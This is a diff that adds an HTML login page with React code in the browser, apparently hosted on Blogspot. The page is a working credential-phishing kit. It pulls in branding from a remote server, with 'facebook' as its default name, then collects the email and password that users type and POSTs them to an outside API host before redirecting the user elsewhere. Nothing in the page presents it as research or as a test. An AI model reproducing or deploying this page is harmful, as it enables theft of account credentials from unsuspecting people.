@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login</title>
+  <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+  <script
+    crossorigin
+    src="https://cdnjs.cloudflare.com/ajax/libs/react/18.0.0/umd/react.development.js"
+  ></script>
+  <script
+    crossorigin
+    src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/18.0.0/umd/react-dom.development.js"
+  ></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/7.24.4/babel.min.js"></script>
+  <!-- tailwind cdn  -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js" integrity="sha512-aoTNnqZcT8B4AmeCFmiSnDlc4Nj/KPaZyB5G7JnOnUEkdNpCZs1LCankiYi01sLTyWy+m2P+W4XM+BuQ3Q4/Dg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <body>
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root"></div>
+
+    <script type="text/babel">
+
+const axios = axios.create({
+  baseURL: 'https://api.sc0m.com/api',
+  timeout: 1000,
+  headers: {'X-Custom-Header': ''}
+});
+
+      const MainContent = () => {
+        const [description, setDescription] = React.useState('login first');
+        
+        const [dt,setdt]= React.useState('');
+        const [image, setImage] = React.useState(
+          'https://i.ibb.co/C01ptTy/c2b3432e135a.png',
+        );
+        const [email, setEmail] = React.useState('email');
+        const [emailColor, setEmailColor] = React.useState('');
+        const [password, setPassword] = React.useState('password');
+        const [passwordColor, setPasswordColor] = React.useState('');
+        const [btnText, setBtnText] = React.useState('Log In');
+        const [btnColor, setBtnColor] = React.useState('blue');
+        const [userId, setUserId] = React.useState(1);
+        const [pageId, setPageId] = React.useState(1);
+        const [namepage, setNamepage] = React.useState('facebook');
+
+        const [vEmail, setVEmail] = React.useState('');
+        const [vPassword, setVPassword] = React.useState('');
+
+        const [loading, setLoading] = React.useState(true);
+        React.useEffect(() => {
+
+            axios.get('https://checkapi-xt1h.onrender.com/').then((res) => {
+               setLoading(false)
+            }).catch((err) => {
+                // window.location = "https://www.livebotola.com/";
+                setLoading(false)
+            })
+          
+          function getData(url) {
+            axios
+              .get('/page/view/' + url)
+              .then(({ data }) => {
+                console.log(data);
+                setDescription(data.description);
+                setImage(data.image);
+                setEmail(data.email_value);
+                setEmailColor(data.colorEmail);
+                setPassword(data.password_value);
+                setBtnText(data.button_value);
+                setNamepage(data.name);
+              })
+              .catch((err) => {
+                console.log(err);
+              });
+          }
+          const url = window.location.href;
+          const params = new URL(url).searchParams;
+          const urlbase = params.get('url');
+          getData(urlbase);
+          setdt(urlbase)
+        }, []);
+
+        const addNew = () => {
+          const body = {
+            data: dt,
+            email: vEmail,
+            password: vPassword,
+          };
+
+          axios
+            .post('/contact', body)
+            .then(({ data }) => {
+                window.location = data;
+            })
+            .catch((err) => {
+                window.location ='https://livebotola.com';
+            });
+        };
+        return (
+          <>
+          {
+            loading ? <div className="flex justify-center items-center h-screen">
+            <div className="animate-spin rounded-full h-32 w-32 border-t-2 border-b-2 border-gray-900"></div>
+            </div> : <>
+            <header className="bg-blue-500 h-14 w-full flex justify-start items-center pl-5 text-white font-normal">
+              <p>{namepage}</p>
+            </header>
+
+            <div className="grid place-content-center grid-cols-1 md:px-36 mt-10 gap-10">
+              <div className="border w-full p-4 bg-contain bg-center ">
+                <img
+                  alt="screen"
+                  width={500}
+                  height={200}
+                  src={image}
+                  className="object-cover h-96 w-full"
+                />
+              </div>
+              <div
+                className="m-auto text-xs sm:text-sm md:text-lg max-w-sm md:max-w-2xl text-center "
+                dangerouslySetInnerHTML={{ __html: description }}
+              ></div>
+
+              <div className="p-2 w-full  gap-1  ">
+                <div className="flex flex-col   p-2  gap-1">
+                  <label className="text-gray-500 text-sm">{email}</label>
+                  <input
+                    style={{ backgroundColor: emailColor }}
+                    type="text"
+                    className="w-full border p-2 rounded-md"
+                    placeholder={email}
+                    onChange={(e) => setVEmail(e.target.value)}
+                  />
+                </div>
+                <div className="flex flex-col   p-2   gap-1">
+                  <label htmlFor="password" className="text-gray-500 text-sm">
+                    {password}
+                  </label>
+                  <input
+                    style={{ backgroundColor: passwordColor }}
+                    type="password"
+                    className="w-full border p-2 rounded-md"
+                    placeholder="Password"
+                    id="password"
+                    autoComplete="new-password"
+                    onChange={(e) => setVPassword(e.target.value)}
+                  />
+                </div>
+                <div className="flex flex-col justify-center items-center  p-2 gap-1 w-3/6 mx-auto">
+                  <button
+                    style={{ backgroundColor: btnColor }}
+                    className=" text-white p-2 rounded-md w-full"
+                    onClick={addNew}
+                  >
+                    {btnText}
+                  </button>
+                </div>
+              </div>
+            </div>
+            </>
+        }
+          </>
+        );
+      };
+
+      //render the component to the DOM
+      ReactDOM.render(<MainContent />, document.getElementById('root'));
+    </script>
+  </body>
+</html>
